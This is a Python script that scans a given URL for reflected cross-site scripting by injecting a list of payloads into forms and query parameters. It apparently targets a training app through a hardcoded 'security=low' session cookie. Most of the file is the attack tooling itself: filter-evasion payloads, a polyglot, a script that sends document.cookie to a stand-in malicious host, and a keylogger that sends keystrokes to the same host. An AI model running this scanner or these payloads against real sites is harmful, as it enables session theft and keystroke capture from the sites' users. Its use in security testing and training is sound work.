import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qsl
import logging
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')  # Only show essential logs
logger = logging.getLogger()

# Session setup
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
session.headers["Cookie"] = "PHPSESSID=34b5af50db2e943348f0581af7f98498; security=low"

# Default XSS payloads
xss_payload_list = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<button onclick=\"alert('XSS')\">Click Me</button>",
    "<a href=\"#\" onclick=\"alert('XSS')\">Click This Link</a>",
    "<script>document.body.innerHTML = '<h1>XSS</h1>';</script>",
    "<script>location.href='https://malicious-site.com';</script>",
    "<script>fetch('https://malicious-site.com/steal?cookie='+document.cookie);</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
    "\" onmouseover=\"alert('XSS')",
    "' onfocus=\"alert('XSS')",
    "</script><script>alert('XSS')</script>",
    ";alert('XSS');//",
    "<script>document.onkeypress = function(e) { fetch('https://malicious-site.com/log?key=' + e.key); }</script>",
    "<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"
]

def get_forms(url):
    """Extract all forms from the given URL."""
    try:
        response = session.get(url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all("form")
    except Exception as e:
        logger.error(f"Error fetching forms from {url}: {e}")
        return []

def form_details(form):
    """Extract details of a form."""
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = [{"type": input_tag.attrs.get("type", "text"), 
                   "name": input_tag.attrs.get("name"), 
                   "value": input_tag.attrs.get("value", "")} 
                  for input_tag in form.find_all("input")]
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception as e:
        logger.error(f"Error extracting form details: {e}")
        details["action"] = "#"
        details["method"] = "get"
        details["inputs"] = [{"type": "text", "name": "test", "value": ""}]
    return details

def submit_form(details, url, payload=""):
    """Submit a form with the given payload."""
    try:
        target_url = urljoin(url, details["action"])
        data = {input_tag["name"]: input_tag["value"] + payload if input_tag["type"] != "submit" else input_tag["value"] 
                for input_tag in details["inputs"]}
        if details["method"] == "post":
            return session.post(target_url, data=data)
        else:
            return session.get(target_url, params=data)
    except Exception as e:
        logger.error(f"Error submitting form: {e}")
        return None

def xss_vulnerable(response, payload):
    """Check if the payload is reflected in the response."""
    if not response:
        return False
    content = response.text.lower()
    return payload.lower() in content

def xss_scan_url(url, payload):
    """Test XSS by appending payloads to query parameters."""
    parsed_url = urlparse(url)
    modified_pairs = [(key, value + payload) for key, value in parse_qsl(parsed_url.query)]
    modified_query = "&".join([f"{key}={value}" for key, value in modified_pairs])
    modified_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
    
    try:
        response = session.get(modified_url)
        return response
    except Exception as e:
        logger.error(f"Error scanning URL {modified_url}: {e}")
        return None

def xss_scan(url):
    """Scan the given URL for XSS vulnerabilities."""
    found_vulnerabilities = []
    forms = get_forms(url)
    # Test forms
    for form in forms:
        details = form_details(form)
        for payload in xss_payload_list:
            response = submit_form(details, url, payload)
            if xss_vulnerable(response, payload):
                found_vulnerabilities.append({
                    "status": "vulnerable",
                    "payload": payload,
                    "type": "XSS"
                })
    # Test query parameters
    if "?" in url:
        for payload in xss_payload_list:
            response = xss_scan_url(url, payload)
            if xss_vulnerable(response, payload):
                found_vulnerabilities.append({
                    "status": "vulnerable",
                    "payload": payload,
                    "type": "XSS"
                })
    return found_vulnerabilities if found_vulnerabilities else [{"status": "not vulnerable", "type": "XSS"}]

if __name__ == "__main__":
    try:
        base_url = sys.argv[1]
        result = xss_scan(base_url)
        # Clean output, only showing status and payload
        clean_result = [{"status": vuln["status"], "payload": vuln["payload"], "type": vuln["type"]} 
                        for vuln in result]
        # Show final result as JSON
        print(json.dumps(clean_result, indent=4))
    except Exception as e:
        print(json.dumps({"error": str(e)}))